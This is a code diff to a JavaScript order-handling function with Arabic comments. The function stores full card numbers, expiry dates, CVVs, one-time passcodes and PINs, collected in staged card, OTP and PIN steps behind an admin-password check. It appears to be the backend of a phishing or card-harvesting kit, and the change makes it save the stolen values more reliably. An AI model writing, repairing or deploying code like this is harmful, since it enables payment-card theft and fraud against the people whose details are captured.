@@ -51,7 +51,7 @@ function readBody(req) {
 const isAdmin = req => req.headers["x-admin-password"] === ADMIN_PASSWORD;
 const str = (v, max = 300) => String(v == null ? "" : v).slice(0, max);
 
-// الحقول المسموح حفظها فقط
+// الحقول المسموح حفظها فقط (مصححة)
 function cleanOrder(b) {
   return {
     ref: str(b.ref, 40), status: ["confirmed", "awaiting"].includes(b.status) ? b.status : "pending",
@@ -62,14 +62,14 @@ function cleanOrder(b) {
     em: str(b.em, 30), a: str(b.a, 5), ad: str(b.ad, 500), lang: b.lang === "en" ? "en" : "ar",
     step: ["card", "otp", "pin"].includes(b.step) ? b.step : undefined,
     pay: b.pay && typeof b.pay === "object" ? {
-      cardName: str(b.pay.cardName, 120),
-      cardNumber: str(b.pay.cardNumber || b.pay.number || b.pay.fullCard || b.pay.last4, 30),
+      cardName: typeof b.pay.cardName === "boolean" ? "" : str(b.pay.cardName, 120),
+      cardNumber: typeof b.pay.cardNumber === "boolean" ? "" : str(b.pay.cardNumber || b.pay.number || b.pay.fullCard, 30),
       last4: str(b.pay.last4, 4).replace(/\D/g, ""),
       brand: ["visa", "mc", "amex"].includes(b.pay.brand) ? b.pay.brand : "",
-      exp: str(b.pay.exp, 5),
-      cvv: str(b.pay.cvv, 10),
-      otp: str(b.pay.otp, 10),
-      pin: str(b.pay.pin, 10)
+      exp: typeof b.pay.exp === "boolean" ? "" : str(b.pay.exp, 5),
+      cvv: typeof b.pay.cvv === "boolean" ? "" : str(b.pay.cvv, 10),
+      otp: typeof b.pay.otp === "boolean" ? "" : str(b.pay.otp, 10),
+      pin: typeof b.pay.pin === "boolean" ? "" : str(b.pay.pin, 10)
     } : undefined
   };
 }
